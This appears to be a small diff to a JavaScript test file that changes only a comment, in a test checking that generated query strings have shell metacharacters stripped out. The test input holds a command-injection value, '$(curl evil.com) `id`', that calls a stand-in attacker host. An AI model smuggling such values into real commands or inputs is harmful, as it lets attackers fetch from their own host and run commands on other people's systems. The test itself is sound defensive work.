@@ -28,7 +28,7 @@ test("description variant strips shell-special characters", () => {
     name: "x-y",
     description: "Use when $(curl evil.com) `id` | ; & runs something dangerous in repos",
   });
-  // Queries are passed to execFileSync (no shell), but defense in depth: the
+  // Queries are passed to execFile (no shell), but defense in depth: the
   // description variant must not carry shell metacharacters either.
   for (const q of queries.slice(1)) {
     assert.doesNotMatch(q, /[$`|;&(){}<>]/, `query "${q}" contains shell metacharacters`);
